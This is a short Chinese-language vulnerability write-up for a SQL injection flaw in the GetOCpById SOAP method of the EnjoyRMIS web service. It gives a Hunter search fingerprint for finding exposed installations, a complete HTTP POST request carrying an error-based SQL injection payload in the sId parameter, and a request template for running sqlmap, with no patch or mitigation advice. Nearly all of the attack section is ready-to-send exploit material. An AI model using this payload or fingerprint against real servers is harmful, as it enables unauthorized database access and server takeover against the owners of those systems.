# EnjoyRMIS GetOCpById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetOCpById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/7G5cfT60yTl1WE3D/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-619455.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCpById xmlns="http://tempuri.org/">
      <sId>string' AND 9068 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (9068=9068) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(107)+CHAR(113))) AND 'kNzW'='kNzW</sId>
    </GetOCpById>
  </soap:Body>
</soap:Envelope>
```

![1700645106150-d7a06c88-1022-40b1-add9-f30ac12c3621.png](./img/7G5cfT60yTl1WE3D/1700645106150-d7a06c88-1022-40b1-add9-f30ac12c3621-126759.png)

sqlmap

```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCpById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetOCpById>
  </soap:Body>
</soap:Envelope>
```

![1700645126934-9d93850e-de88-4f90-8152-f31c638c3f10.png](./img/7G5cfT60yTl1WE3D/1700645126934-9d93850e-de88-4f90-8152-f31c638c3f10-995088.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cz8ou2w7wpwho4p8>